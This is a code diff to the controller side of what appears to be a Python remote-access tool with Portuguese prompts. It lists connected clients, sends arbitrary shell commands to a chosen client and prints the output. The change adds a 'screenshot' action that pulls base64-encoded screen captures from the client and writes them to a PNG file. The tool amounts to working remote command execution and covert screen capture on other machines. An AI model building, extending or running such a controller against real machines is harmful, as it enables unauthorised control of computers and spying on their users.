@@ -1,5 +1,6 @@
 import os
 import socket
+import base64
 
 host = '127.0.0.1'
 port = 8221
@@ -67,17 +68,35 @@ while True:
     
     elif int(com_qual) in numero_conectados:
 
-        print(f'Conectado em {conectados[int(com_qual)][0]}')
-        conectados[int(com_qual)][1].send(str.encode('cmd'))
-        while True:
-            comando = str(input('$:'))
-            
-            conectados[int(com_qual)][1].send(str.encode(comando))
-            if comando == 'leave':
-                break
+        print(f'Conectado em {conectados[int(com_qual)][0]}\n')
+        print('[cmd] executar comandos no prompt de comando do cliente\n[screenshot] capturar tela do cliente')
 
-            output = conectados[int(com_qual)][1].recv(1024).decode()
-            print(output)
+        acao = str(input('Ação desejada no cliente:'))
+        conectados[int(com_qual)][1].send(str.encode(acao))
+        if acao == 'cmd':
+            print('\n[leave] para desconectar do cliente.\n')
+            while True:
+                comando = str(input('$:'))
+                
+                conectados[int(com_qual)][1].send(str.encode(comando))
+                if comando == 'leave':
+                    break
+
+                output = conectados[int(com_qual)][1].recv(1024).decode()
+                print(output)
+        if acao == 'screenshot':
+            converted_string = ''
+            for i in range(0,1000,1):
+                converted_string += conectados[int(com_qual)][1].recv(100000).decode()
+            print(len(converted_string))
+            decodeit = open('screenshot_recebida.png', 'wb') 
+            print('1')
+            decodeit.write(base64.b64decode((converted_string))) 
+            print('2')
+            decodeit.close()
+            print('3')
+            
+            pass
     else:
         pass
 
